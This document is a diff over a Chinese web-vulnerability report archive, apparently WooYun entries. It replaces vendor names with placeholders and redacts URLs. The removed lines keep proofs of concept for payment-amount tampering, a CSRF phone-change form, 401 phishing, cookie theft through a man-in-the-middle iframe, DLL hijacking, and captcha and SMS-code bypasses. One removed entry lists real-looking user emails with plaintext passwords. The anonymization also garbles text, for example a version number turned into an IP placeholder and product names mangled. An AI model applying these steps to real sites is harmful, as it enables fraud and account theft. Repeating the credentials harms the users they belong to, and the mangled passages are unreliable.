-**详情**: 淘宝浏览器最新版（版本3.5.1.1084），官方下载安装版本taobrowser(3.5.1.1084)-bc-ars.exe，windows xp sp4环境，淘宝浏览器的主程序在运行中浏览某些特定网页(如搜狐视频)后关闭页面时会加载一个不带路径的alidcp.dll文件（该文件没有随淘宝浏览器一起安装），导致恶意攻击者可以伪造该DLL文件用于劫持，严重时可危害浏览器用户的安全，如帐号窃取、网络钓鱼等。同时旧版本中存在的dxva2.dll、mf.dll等同样的问题依然没有解决，在新版本中仍可检测到。
+**详情**: 某电商平台浏览器最新版（版本3.5.1.1084），官方下载安装版本taobrowser([IP已脱敏]4)-bc-ars.exe，windows xp sp4环境，某电商平台浏览器的主程序在运行中浏览某些特定网页(如搜狐视频)后关闭页面时会加载一个不带路径的alidcp.dll文件（该文件没有随某电商平台浏览器一起安装），导致恶意攻击者可以伪造该DLL文件用于劫持，严重时可危害浏览器用户的安全，如帐号窃取、网络钓鱼等。同时旧版本中存在的dxva2.dll、mf.dll等同样的问题依然没有解决，在新版本中仍可检测到。
 
 **POC**: (见原文)
 
@@ -17023,9 +17023,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 12306 新的图片验证码可以被绕过, 可以继续用老的4字母验证码登陆12306 .老的4字母验证码比较容易电脑识别, 可以用注册或其他验证码接口直接登录.漏洞1:https://kyfw.12306.cn/otn/passcodeNew/getPassCodeNew?module=regist&rand=sjrand&0.54322674895787漏洞2:https://kyfw.12306.cn/otn/passcodeNew/getPassCodeNew?module=other&rand=sjrand&0.36124213441517变换moudle，即可获取不同操作的验证码，如订单是 passenger 。这两个连接可以获取4字母验证码, 12306登陆接口可以用这里识别的验证码直接登录. 这个情况下, 新的图片验证码形同虚设.
+**详情**: 12306 新的图片验证码可以被绕过, 可以继续用老的4字母验证码登陆12306 .老的4字母验证码比较容易电脑识别, 可以用注册或其他验证码接口直接登录.漏洞1:https://example.com/[已脱敏] passenger 。这两个连接可以获取4字母验证码, 12306登陆接口可以用这里识别的验证码直接登录. 这个情况下, 新的图片验证码形同虚设.
 
-**POC**: 1. 先获取验证码(老的4字母验证码)GET https://kyfw.12306.cn/otn/passcodeNew/getPassCodeNew?module=regist&rand=sjrand&0.54322674895787 HTTP/1.12. 电脑识别验证码, 检查验证码正确POST https://kyfw.12306.cn/otn/passcodeNew/checkRandCodeAnsyn HTTP/1.1randCode=9npm&rand=sjrand&randCode_validate=3. Post到Login网址, 即可登陆POST https://kyfw.1
+**POC**: 1. 先获取验证码(老的4字母验证码)GET https://example.com/[已脱敏] HTTP/1.12. 电脑识别验证码, 检查验证码正确POST https://example.com/[已脱敏] HTTP/1.1randCode=9npm&rand=sjrand&randCode_validate=3. Post到Login网址, 即可登陆POST https://kyfw.1
 
 **绕过**: 过滤绕过
 
@@ -17033,8 +17033,8 @@
 ---
 
 ---
-### [wooyun-2014-087466] 多款手机浏览器UI跨域钓鱼漏洞（UC/百度/联想等）
-**厂商**: UC，百度，联想等 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2014-087466] 多款手机浏览器UI跨域钓鱼漏洞（UC/某搜索引擎/联想等）
+**厂商**: UC，某搜索引擎，联想等 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -17045,9 +17045,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 好吧，我先承认这不是真正意义上的跨域，但可以造成同样的效果。测试了几款国产安卓浏览器，发现UC（最新版）、百度浏览器（最新版）、联想(vibe ui自带浏览器)、华为(3c自带浏览器)中存在该问题。其它浏览器未必不存在，只是对我这个exp不敏感罢了（要么弹不出新窗口，要么对401对话框不敏感）。现在安卓浏览器都可以打开很多标签页，而且每个标签页之间都严格遵守同源策略，互不干扰。但有一种情况，当浏览器中同时存在两个已经打开的标签页时，并且用户正在浏览b标签，此时a标签弹出一个由js形成的浏览器对话框（例如alert、confirm、prompt以及401auth），如果这个窗体是全局的，那么这个窗体将会出现在b标签页的上方，如果又没有明确提示来源页的话，那么用户会误认为是b标签页弹出的信息，从而导致钓鱼或者欺骗。
+**详情**: 好吧，我先承认这不是真正意义上的跨域，但可以造成同样的效果。测试了几款国产安卓浏览器，发现UC（最新版）、某搜索引擎浏览器（最新版）、联想(vibe ui自带浏览器)、华为(3c自带浏览器)中存在该问题。其它浏览器未必不存在，只是对我这个exp不敏感罢了（要么弹不出新窗口，要么对401对话框不敏感）。现在安卓浏览器都可以打开很多标签页，而且每个标签页之间都严格遵守同源策略，互不干扰。但有一种情况，当浏览器中同时存在两个已经打开的标签页时，并且用户正在浏览b标签，此时a标签弹出一个由js形成的浏览器对话框（例如alert、confirm、prompt以及401auth），如果这个窗体是全局的，那么这个窗体将会出现在b标签页的上方，如果又没有明确提示来源页的话，那么用户会误认为是b标签页弹出的信息，从而导致钓鱼或者欺骗。
 
-**POC**: 下面就是利用该方式跨域淘宝进行401钓鱼的演示auth.php<?if($_SERVER['PHP_AUTH_PW'] =="" || $_SERVER['PHP_AUTH_USER'] =="" ){header('WWW-Authenticate: Basic realm="-taobao.com                                                                                                                                                     
+**POC**: 下面就是利用该方式跨域某电商平台进行401钓鱼的演示auth.php<?if($_SERVER['PHP_AUTH_PW'] =="" || $_SERVER['PHP_AUTH_USER'] =="" ){header('WWW-Authenticate: Basic realm="-taobao.com                                                                                                                                                     
 
 **绕过**: 直接利用
 
@@ -17091,7 +17091,7 @@
 
 **详情**: 通过burp抓包修改参数可以一分钱购买商品，且已发货！
 
-**POC**: 习惯性抓包先选中一款我种草很久的爽肤水下一步提交订单使用burp抓包截获返回值选中地方看到需要支付的钱数改为0.01支付成功支付宝截图返回淘世界显示已支付全款这是我今天早上为了写报告还原的流程，前几天第一次发现的测试的订单已经发货了。说明没有人工审核。而且你们页面上居然没有取消订单的选项！！！请联系我，提供收件人信息，你们自行拦截货物。应该不会为了几十块国际运费查我水表吧哈哈哈
+**POC**: 习惯性抓包先选中一款我种草很久的爽肤水下一步提交订单使用burp抓包截获返回值选中地方看到需要支付的钱数改为0.01支付成功某电商平台截图返回淘世界显示已支付全款这是我今天早上为了写报告还原的流程，前几天第一次发现的测试的订单已经发货了。说明没有人工审核。而且你们页面上居然没有取消订单的选项！！！请联系我，提供收件人信息，你们自行拦截货物。应该不会为了几十块国际运费查我水表吧哈哈哈
 
 **绕过**: 直接利用
 
@@ -17121,8 +17121,8 @@
 ---
 
 ---
-### [wooyun-2015-091309] 桌面版百度浏览器可被中间人攻击
-**厂商**: 百度 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2015-091309] 桌面版某搜索引擎浏览器可被中间人攻击
+**厂商**: 某搜索引擎 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -17133,9 +17133,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 一句话来说：虽然百度浏览器会对直接访问的网站校验TLS证书，但是对于iframe发起的HTTPS链接，不校验TLS证书是否有效。直接访问：使用iframe（左百度，右IE11），测试地址：http://nextprime.drivehq.com/iframe.html于是中间人可利用iframe来窃取HTTPS网站的cookie。方法如下：1、在公共区域建立免费Wi-Fi热点，诱使人们连接。2、连接后跳转到“认证页”。用User-Agent判断是否为百度浏览器，如果是，用以下页面迫使用户对你感兴趣的HTTPS网站发起链接，同时用自己自签名证书进行中间人攻击，拿到cookie。百度浏览器不会有任何警告。<!DOCTYPE html><html><head><meta charset="utf-8" /><title>MITM</title><style>iframe {opacity: 0;
+**详情**: 一句话来说：虽然某搜索引擎浏览器会对直接访问的网站校验TLS证书，但是对于iframe发起的HTTPS链接，不校验TLS证书是否有效。直接访问：使用iframe（左某搜索引擎，右IE11），测试地址：https://example.com/[已脱敏] html><html><head><meta charset="utf-8" /><title>MITM</title><style>iframe {opacity: 0;
 
-**POC**: 打开Fiddler，打开解密HTTPS（不装Fiddler根证书），然后使用百度浏览器打开在线测试地址：http://nextprime.drivehq.com/bdmitm.html。之后，就能在Fiddler中看到HTTPS网站的cookie。
+**POC**: 打开Fiddler，打开解密HTTPS（不装Fiddler根证书），然后使用某搜索引擎浏览器打开在线测试地址：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -17155,7 +17155,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 首先，需要的是要注册一个用户名，注册过程无任命的限制，注册完成后，进行认证界面然后记录页面上的安全码后，构造链接如下http://www.wozhongla.com/cbportal/userprofile/getSmsVeriCode.htm?userid=""&username=""&mobile=""&veriCode=""其中userid可以在认证的页面代码中直接找到，username就是你注册的用户名，mobile为你要攻击的手机号码，vericode为你的安全码。然后访问后，如果返回结果为1则成功，如果为3则为你的安全码是错误的。返回为2则你的攻击手机已经注册过了。有两个条件，第一：用户名必须是真实注册的。第二：在提交过程中，用户认证的页面是不能关闭的，一但关闭安全码失效无法进行攻击
+**详情**: 首先，需要的是要注册一个用户名，注册过程无任命的限制，注册完成后，进行认证界面然后记录页面上的安全码后，构造链接如下https://example.com/[已脱敏]""&username=""&mobile=""&veriCode=""其中userid可以在认证的页面代码中直接找到，username就是你注册的用户名，mobile为你要攻击的手机号码，vericode为你的安全码。然后访问后，如果返回结果为1则成功，如果为3则为你的安全码是错误的。返回为2则你的攻击手机已经注册过了。有两个条件，第一：用户名必须是真实注册的。第二：在提交过程中，用户认证的页面是不能关闭的，一但关闭安全码失效无法进行攻击
 
 **POC**: (见原文)
 
@@ -17221,9 +17221,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: inurl:http://chaxun.neea.edu.cn/examcenter/recerti.cn?op=doApp&loginName=随便打开1个http://chaxun.neea.edu.cn/examcenter/recerti.cn?op=doApp&loginName=chaorentw@qq.com&pwd=chaoren用户密码全部泄漏了登录看看loginName=977574957@qq.com&pwd=13287080132http://chaxun.neea.edu.cn/examcenter/scoreprint.cn?op=doLoginSystem&login_system_type=cet换1个看看http://chaxun.neea.edu.cn/examcenter/recerti.cn?op=doApp&loginName=chuanzimo@
+**详情**: inurl:https://example.com/[已脱敏]
 
-**POC**: http://chaxun.neea.edu.cn/examcenter/recerti.cn?op=doApp&loginName=494578742@qq.com&pwd=197671http://chaxun.neea.edu.cn/examcenter/recerti.cn?op=doApp&loginName=1145438073@qq.com&pwd=19920703http://chaxun.neea.edu.cn/examcenter/recerti.cn?op=doApp&loginName=757815362@qq.com&pwd=000000
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -17231,8 +17231,8 @@
 ---
 
 ---
-### [wooyun-2012-011389] 任意QQ秒点QQ旋风图标
-**厂商**: 腾讯 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误
+### [wooyun-2012-011389] 任意某互联网公司秒点某互联网公司旋风图标
+**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -17243,13 +17243,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 首先，俺认为腾讯不应该忽略此类漏洞。1 虽然此类问题，严格来说不属于安全漏洞，但是是属于设计的逻辑缺陷的。2 此类漏洞，可以被利用去进行买卖从而获利，所以并不是没有利用价值。
+**详情**: 首先，俺认为某互联网公司不应该忽略此类漏洞。1 虽然此类问题，严格来说不属于安全漏洞，但是是属于设计的逻辑缺陷的。2 此类漏洞，可以被利用去进行买卖从而获利，所以并不是没有利用价值。
 
-**POC**: 实现方法：1 任意打开一个qq.com域名的网站，登录获取cookie2 打开地址 http://xiazai.qq.com/xiazai/front.php/index/index_c/xfscore3 点击我要点亮即可，无延迟，秒亮的证据图如下
+**POC**: 实现方法：1 任意打开一个某互联网公司.com域名的网站，登录获取cookie2 打开地址 https://example.com/[已脱敏] 点击我要点亮即可，无延迟，秒亮的证据图如下
 
 **绕过**: 直接利用
 
-**修复**: 稍微做下限制下就可以了。希望腾讯不要忽略、、、
+**修复**: 稍微做下限制下就可以了。希望某互联网公司不要忽略、、、
 ---
 
 ---
@@ -17297,8 +17297,8 @@
 ---
 
 ---
-### [wooyun-2013-020902] 微信爆用户第一次所设置的微信帐号
-**厂商**: 腾讯 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2013-020902] 某互联网公司爆用户第一次所设置的某互联网公司帐号
+**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -17309,9 +17309,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 无聊间和妹子聊微信，发现一个，真是奇葩啊！
+**详情**: 无聊间和妹子聊某互联网公司，发现一个，真是奇葩啊！
 
-**POC**: 我们先加一下杨幂的微信喽，看到杨幂的现在微信号是:miniyangmi然后我们看到杨幂的一条信息现在我们去手机的设置，选择应用程序，选择管理应用程序，找到并且点微信，在点清除数据。然后在次登录微信，会显示载入数据中，然后原来的那条信息会显示出来，我们就可以看到用户第一次的微信帐号了。我们现在看到了杨幂第一次设置的微信号是：yangmi362297.有木有她的粉丝解释下362297是什么个意思哦？
+**POC**: 我们先加一下杨幂的某互联网公司喽，看到杨幂的现在某互联网公司号是:miniyangmi然后我们看到杨幂的一条信息现在我们去手机的设置，选择应用程序，选择管理应用程序，找到并且点某互联网公司，在点清除数据。然后在次登录某互联网公司，会显示载入数据中，然后原来的那条信息会显示出来，我们就可以看到用户第一次的某互联网公司帐号了。我们现在看到了杨幂第一次设置的某互联网公司号是：yangmi362297.有木有她的粉丝解释下362297是什么个意思哦？
 
 **绕过**: 直接利用
 
@@ -17319,8 +17319,8 @@
 ---
 
 ---
-### [wooyun-2013-036640] QQ音乐最新版本多处DLL劫持
-**厂商**: 腾讯 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2013-036640] 某互联网公司音乐最新版本多处DLL劫持
+**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -17331,7 +17331,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 测试时QQ音乐默认安装路径：C:\Program Files\Tencent\QQMusic具体利用方法：QQMusic.exe运行时会加载四个不存在的DLL文件分别为：c:\windows\system32\macromed\common\swsupport.dllc:\windows\system32\macromed\shockwave\swsupport.dllC:\Program Files\Tencent\QQMusic\p2plog.dllC:\Program Files\Tencent\QQMusic\ieframe.dll只要相应的目录下放入对应名称的DLL文件，就会运行QQMusic.exe的同时会加载对应的DLL以上是在无flash组件环境下测试的结果。如果在有安装flash组件环境下测试只劫持两个不存的DLL分别为C:\Program Files\Tencent\Q
+**详情**: 测试时某互联网公司音乐默认安装路径：C:\Program Files\Tencent\某互联网公司Music具体利用方法：某互联网公司Music.exe运行时会加载四个不存在的DLL文件分别为：c:\windows\system32\macromed\common\swsupport.dllc:\windows\system32\macromed\shockwave\swsupport.dllC:\Program Files\Tencent\某互联网公司Music\p2plog.dllC:\Program Files\Tencent\某互联网公司Music\ieframe.dll只要相应的目录下放入对应名称的DLL文件，就会运行某互联网公司Music.exe的同时会加载对应的DLL以上是在无flash组件环境下测试的结果。如果在有安装flash组件环境下测试只劫持两个不存的DLL分别为C:\Program Files\Tencent\Q
 
 **POC**: (见原文)
 
@@ -17377,7 +17377,7 @@
 
 **详情**: 不知道后台计算的时候是按什么计算的，总之前台是可以通过url修改订单，而且是不需要权限的修改
 
-**POC**: 首先注册一个号码：13111112343，然后正常下单：到订单里面点查看订单：点击返回修改点提交抓包重点就在这条url:http://www.17u.net/WDHandler/LineOrder.ashx?action=updateLine&Platform=net&lineid=4593689&b2bMemberId=207967&TotalPrice=2750.00&TotalMan=1&TotalChild=0&b2cname=13111112343&b2cphone=13111112343&b2cemail=&remark=&dateText=2015-3-19%200:00:00&
+**POC**: 首先注册一个号码：13111112343，然后正常下单：到订单里面点查看订单：点击返回修改点提交抓包重点就在这条url:https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -17386,7 +17386,7 @@
 
 ---
 ### [wooyun-2013-044480] 利用移动某客户端应用可批量获取用户服务密码(地区性)
-**厂商**: 中国移动 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
+**厂商**: 某运营商 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 认证接口
 
@@ -17407,8 +17407,8 @@
 ---
 
 ---
-### [wooyun-2013-038943] 百度输入法调用CreateProcess函数漏洞
-**厂商**: 百度 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2013-038943] 某搜索引擎输入法调用CreateProcess函数漏洞
+**厂商**: 某搜索引擎 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -17441,7 +17441,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://android.myapp.com/myapp/detail.htm?apkName=com.netschool.main.ui发送验证码后，验证码直接返回输入验证码，即可重置成功登录主站登录验证短信轰炸POST http://ns.huatu.com/nsapi/base/captcha/phone HTTP/1.1Content-Type: application/x-www-form-urlencoded;charset=UTF-8sid: 0username:qqopenid: 0imei: 08:00:27:b4:8b:30c_platform: androiduserid: 0ua: Google Galaxy Nexus - 4.3 - API 18 - 720x1280_2-Android4.3areaid: 0c_version: NetSchool_1.6
+**详情**: https://example.com/[已脱敏] https://example.com/[已脱敏] HTTP/1.1Content-Type: application/x-www-form-urlencoded;charset=UTF-8sid: 0username:某互联网公司openid: 0imei: 08:00:27:b4:8b:30c_platform: androiduserid: 0ua: Google Galaxy Nexus - 4.3 - API 18 - 720x1280_2-Android4.3areaid: 0c_version: NetSchool_1.6
 
 **POC**: 如上
 
@@ -17463,9 +17463,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 随便选择一个手表等等，下面的东西也想让我买吗？好吧，那就一起吧提交订单选择支付宝支付，提交，抓包修改成1，forward
+**详情**: 随便选择一个手表等等，下面的东西也想让我买吗？好吧，那就一起吧提交订单选择某电商平台支付，提交，抓包修改成1，forward
 
-**POC**: 随便选择一个手表等等，下面的东西也想让我买吗？好吧，那就一起吧提交订单选择支付宝支付，提交，抓包修改成1，forward
+**POC**: 随便选择一个手表等等，下面的东西也想让我买吗？好吧，那就一起吧提交订单选择某电商平台支付，提交，抓包修改成1，forward
 
 **绕过**: 直接利用
 
@@ -17485,9 +17485,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1 这里随便选了个商品作为演示，未真正支付利用。2 正常下单程序去下单，然后支付，直到这一步。3 然后发现付款，其实就是访问链接http://www.yoger.com.cn/API_pay/alipay_direct/alipayto.asp?orderID=po******_****&paySum=10904 发现前面的orderID就是订单号，后面的paySum就是支付的金额总和。那么果断修改下再访问，把1090改成0.01。http://www.yoger.com.cn/API_pay/alipay_direct/alipayto.asp?orderID=po******_****&paySum=0.015 呵呵，这样就可以一分钱购买了。
+**详情**: 1 这里随便选了个商品作为演示，未真正支付利用。2 正常下单程序去下单，然后支付，直到这一步。3 然后发现付款，其实就是访问链接https://example.com/[已脱敏] 发现前面的orderID就是订单号，后面的paySum就是支付的金额总和。那么果断修改下再访问，把1090改成0.01。https://example.com/[已脱敏] 呵呵，这样就可以一分钱购买了。
 
-**POC**: 1 可以看到上图中，已经是跳转到了支付宝的支付页面了，已经是支付宝的域名了，所以优个的服务器已经无法控制了，这里我就不去支付了。2 然后还有个问题需要说明，这里由于是在支付的时候进行的串改，所以在订单中显示的支付金额应该还是原价，所以一般也很难被发现吧。包括你们后台的录订单的信息应该也是正常的，只是支付宝的真正收款被串改了。3 所以，有可能这个漏洞已经被不法分子给利用了，建议你们还是自己排查排查下吧。目测如果被利用，然后要找出来，难度也挺大的！所以还是赶紧修补吧！！！
+**POC**: 1 可以看到上图中，已经是跳转到了某电商平台的支付页面了，已经是某电商平台的域名了，所以优个的服务器已经无法控制了，这里我就不去支付了。2 然后还有个问题需要说明，这里由于是在支付的时候进行的串改，所以在订单中显示的支付金额应该还是原价，所以一般也很难被发现吧。包括你们后台的录订单的信息应该也是正常的，只是某电商平台的真正收款被串改了。3 所以，有可能这个漏洞已经被不法分子给利用了，建议你们还是自己排查排查下吧。目测如果被利用，然后要找出来，难度也挺大的！所以还是赶紧修补吧！！！
 
 **绕过**: 直接利用
 
@@ -17495,8 +17495,8 @@
 ---
 
 ---
-### [wooyun-2013-024373] WP版百度浏览器一个钓鱼欺诈漏洞
-**厂商**: 百度 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2013-024373] WP版某搜索引擎浏览器一个钓鱼欺诈漏洞
+**厂商**: 某搜索引擎 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -17507,9 +17507,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 对http://www.baidu.com:80@www.evil.com/之类的域名没有进行跳转提示或者显示真实域名，用户可能会被一个恶意构造的域名欺骗。另外，如果网页HTML代码中使用<title>http://www.evil.com/</title> 的话，由于网页标题和地址栏在一起，可能会带来更强的欺骗性，因为用户即使点击了标题，地址栏显示的也是最前面几个字符（如证明）
+**详情**: 对https://example.com/[已脱敏] 的话，由于网页标题和地址栏在一起，可能会带来更强的欺骗性，因为用户即使点击了标题，地址栏显示的也是最前面几个字符（如证明）
 
-**POC**: 例如构造钓鱼网页http://passport.baidu.com:80@www.evil.com/网页内容为<html><title>http://passport.baidu.com - 百度账号</title><body> phishing contents .. </body></html>用户打开后地址栏（如果用户不手动往后拖动的话，但是由于点击以后默认是地址全选状态所以拖动很麻烦）和标题均会显示“http://passport.baidu.com”，从而带来一定的欺骗性。建议参考uc浏览器给出跳转警告，或者qq浏览器直接跳走或者不予打开。
+**POC**: 例如构造钓鱼网页https://example.com/[已脱敏] - 某搜索引擎账号</title><body> phishing contents .. </body></html>用户打开后地址栏（如果用户不手动往后拖动的话，但是由于点击以后默认是地址全选状态所以拖动很麻烦）和标题均会显示“https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -17529,7 +17529,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 奥鹏教育http://tongxue.open.com.cn:15000/login/index.html后台地址，没验证码，可爆破返回长度256是可登陆的账号  lina密码  123456
+**详情**: 奥鹏教育https://example.com/[已脱敏]  lina密码  123456
 
 **POC**: (见原文)
 
@@ -17575,7 +17575,7 @@
 
 **详情**: 思路比较混乱，先发个支付漏洞，礼物那里重置金额更改1 现在开始将密码漏洞，首先注册时不填邮箱，但填手机的，无需验证码，这个时候就会导致一个可以利用的问题，为什么说可以利用呢，我可以csrf诱骗很多人的手机号改为我的，然后我想怎么找回密码都可以，如图为13800138000的手机号用户，不知道能不能去改医生的账号2 修改邮箱和手机都是post，但解析的时候修改手机get也能够解析，也能够通过csrf进行更改手机号和邮箱url能够直接更改的原因在于解析post没有控制只解析form而不解析url传参csrf的话关键功能需要增加防护token危害性在于哪里，用户点击url或者访问某网址但好大夫的cookies没有失效的话会自动更改注册的手机号和邮箱，由于设计缺陷找回密码不需要输入用户名，我根本不需要知道改了哪个用户的，系统自动回告诉我，医生的能改影响就很大了
 
-**POC**: 手机号更改的url 放在网站上或发给别人就可以http://passport.haodf.com/user/modifyMobileForPost?isReceiveReply=0&mobile=13917114824&submit=+%C8%B7+%B6%A8+手机号的csrf文件<html><body><form id="wrhoooo" name="wrhoooo" action="http://passport.haodf.com/user/modifyMobileForPost" method="post"><input type="test" name="isReceiveRepl
+**POC**: 手机号更改的url 放在网站上或发给别人就可以https://example.com/[已脱敏] id="wrhoooo" name="wrhoooo" action="https://example.com/[已脱敏]" method="post"><input type="test" name="isReceiveRepl
 
 **绕过**: 直接利用
 
@@ -17583,8 +17583,8 @@
 ---
 
 ---
-### [wooyun-2014-054959] 支付宝声波支付可以被人记录声音恶意支付
-**厂商**: 支付宝 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2014-054959] 某电商平台声波支付可以被人记录声音恶意支付
+**厂商**: 某电商平台 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -17595,7 +17595,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 支付宝的声波离线支付虽然方便，但也带来了一定的安全问题，比如可以记录他人声波进行恶意消费。看到支付宝可以离线声波支付，果断尝试了一下，感觉速度很快非常便捷，但是有一点却吓坏我了，我是在友宝机子上测试的，当我的手机靠近机子打开我要支付之后竟然没有提示要支付多少钱，也没有提醒是否支付便直接从我的银行卡中把钱扣了。好吧 其实我知道支付宝的免密码支付是有限额的，但是这样消费的感觉还是让我不可接受。如果说上面的问题是不能说是一个问题的话，下面这个问题简直是把我惊呆了，废话不多说，直接说过程！！！！！！我用自己的手机打开声波支付的我要支付，用另一个手机将piu piu 的声音录制下来，然后用录音到友宝的机子上买饮料，竟然出货了 。重新播放录音，再次购买，又成功了 。
+**详情**: 某电商平台的声波离线支付虽然方便，但也带来了一定的安全问题，比如可以记录他人声波进行恶意消费。看到某电商平台可以离线声波支付，果断尝试了一下，感觉速度很快非常便捷，但是有一点却吓坏我了，我是在友宝机子上测试的，当我的手机靠近机子打开我要支付之后竟然没有提示要支付多少钱，也没有提醒是否支付便直接从我的银行卡中把钱扣了。好吧 其实我知道某电商平台的免密码支付是有限额的，但是这样消费的感觉还是让我不可接受。如果说上面的问题是不能说是一个问题的话，下面这个问题简直是把我惊呆了，废话不多说，直接说过程！！！！！！我用自己的手机打开声波支付的我要支付，用另一个手机将piu piu 的声音录制下来，然后用录音到友宝的机子上买饮料，竟然出货了 。重新播放录音，再次购买，又成功了 。
 
 **POC**: 视频密码：147258其实被别人录制声音的可能性不是很大如果别人在机器上安装一个录音机的话，他便可以把你的声音录制下来随便买点什么的。
 
@@ -17617,7 +17617,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 额。。自评RANK1吧，只是很奇怪。。先看两个洞和回复吧：WooYun: PPTV某接口涉及不当可导致可暴力破解可撞库（账号主站通用）WooYun: PPTV又又又一接口设计不当导致可暴力破解可撞库#4（账号主站通用+验证码绕过）这两个，第一个洞厂商说已经修复了，第二个洞厂商又说调用的是同一接口接下来先看一下第一个洞的接口吧：http://game.g.pptv.com/guest/c/sq/api.php?action=logout看了一下确实已经fix了，加了验证码（没有测试能不能绕过）OK接下来再看一下第二个洞的接口：http://user.g.pptv.com/login/cms/?gid=dgwm来到以后还是有验证码限制但是可以绕过，可以继续暴力破解的，和之前一样，可以看出并没有对服务端验证而做出修复随便选几个登陆主站查看一下是成功的。。那么问题来了，既然是调用的同一接口，为什么
+**详情**: 额。。自评RANK1吧，只是很奇怪。。先看两个洞和回复吧：WooYun: PPTV某接口涉及不当可导致可暴力破解可撞库（账号主站通用）WooYun: PPTV又又又一接口设计不当导致可暴力破解可撞库#4（账号主站通用+验证码绕过）这两个，第一个洞厂商说已经修复了，第二个洞厂商又说调用的是同一接口接下来先看一下第一个洞的接口吧：https://example.com/[已脱敏]
 
 **POC**: 说好的礼物呢哥。。？：）
 
@@ -17650,7 +17650,7 @@
 
 ---
 ### [wooyun-2012-013132] 飞信客户数据越界获取
-**厂商**: 中国移动 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷
+**厂商**: 某运营商 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 认证接口, 上传功能
 
@@ -17672,7 +17672,7 @@
 
 ---
 ### [wooyun-2011-02513] 移动手机支付业务逻辑漏洞（题目不能太明显）
-**厂商**: 中国移动 | **年份**: 2011 | **类型**: 设计缺陷/逻辑错误
+**厂商**: 某运营商 | **年份**: 2011 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -17683,7 +17683,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: https://p.10086.cn/WAPUSER/900918.dos还是这个页面，其实和wooyun的那个漏洞，是同时发现的，只是没有同时爆出来。我在blog提醒过你们，谁让你们不关注呢？这个页面的手机验证码，只有4位，可以直接爆破。只是有个小小的时间限制。但是在只有1W次以内的请求中，那个小小的时间限制，可以忽略不计。
+**详情**: https://example.com/[已脱敏]
 
 **POC**: 这是错误页面提醒：“对不起，验证码错误”无限次请求，在一段时间内，验证码不变，具体多长时间我没测试。...手机没电了，就不抓图了。空了补上。
 
@@ -17705,7 +17705,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 今天大雪封路  没有去幼儿园报名 呆在家里没事做给整出来的...http://gugong.228.com.cn/index.html  永乐票务系统的先注册一个账号 然后开始订票由于没有对购买数量进行严格限制提交订单后改包直接导致了下图情况然后选择支付宝支付..(没有继续深入 20块钱可不是一个小数目,况且人还不在北京..)继续看下去 发现永乐不仅仅只是这一个站点有此漏洞主订票站 http://www.228.com.cn/topic/F1/ 也存在诸如此类漏洞望技术能够好好看看 该补的趁早补补..
+**详情**: 今天大雪封路  没有去幼儿园报名 呆在家里没事做给整出来的...https://example.com/[已脱敏]  永乐票务系统的先注册一个账号 然后开始订票由于没有对购买数量进行严格限制提交订单后改包直接导致了下图情况然后选择某电商平台支付..(没有继续深入 20块钱可不是一个小数目,况且人还不在北京..)继续看下去 发现永乐不仅仅只是这一个站点有此漏洞主订票站 https://example.com/[已脱敏] 也存在诸如此类漏洞望技术能够好好看看 该补的趁早补补..
 
 **POC**: 故宫一日游 仅仅只需20元哦亲 还包邮~~PS:诚心求枚码啊,在乌云外围观望好久了...
 
@@ -17715,8 +17715,8 @@
 ---
 
 ---
